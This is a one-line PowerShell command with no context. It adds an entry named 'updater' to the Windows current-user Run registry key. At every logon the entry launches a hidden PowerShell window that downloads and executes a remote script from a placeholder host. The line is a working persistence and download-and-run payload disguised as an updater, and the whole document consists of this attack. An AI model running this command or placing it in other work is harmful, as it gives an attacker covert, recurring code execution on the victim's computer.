Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'updater' -Value "powershell -w hidden -c iex(irm https://example.invalid/u.ps1)"
